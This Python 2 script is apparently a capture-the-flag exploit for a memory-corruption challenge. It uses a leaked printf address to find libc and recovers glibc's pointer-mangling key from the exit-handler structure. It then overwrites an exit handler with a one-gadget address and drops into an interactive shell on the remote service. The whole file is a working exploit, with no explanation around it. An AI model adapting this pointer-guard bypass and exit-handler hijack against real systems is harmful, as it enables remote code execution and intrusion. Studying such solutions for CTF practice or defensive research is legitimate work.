#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))



_dl_fini = 0x3daab0
initial = 0x3c5c40 + 0x18
magic_addr = 0x000000000004526A

recvuntil("printf(): ")
base_libc_leak = int(recvuntil("\n")) - 0x0000000000055800
print "[+] libc address: " + hex(base_libc_leak)

recvuntil("read address:\n")
s.send(str(base_libc_leak + initial) + "\n")
recvuntil("content: ")
crypt = int(recvuntil("\n"))
key = ror(crypt, 0x11, 64) ^ (base_libc_leak + _dl_fini)
print "[+] key: " + hex(key)
recvuntil("write address:\n")
print "[+] writing at: " + hex(base_libc_leak + initial)
s.send(str(base_libc_leak + initial) + "\n")
recvuntil("new value:\n")
print "[+] write value: " + hex( rol((base_libc_leak + magic_addr) ^ (key), 0x11, 64 ))
# print "brek: " + hex(base_libc_leak + 0x0000000000039FD8)
s.send(str(rol((base_libc_leak + magic_addr) ^ (key), 0x11, 64 )) + "\n")
print "[+] interactive"
interactive()
s.close()


#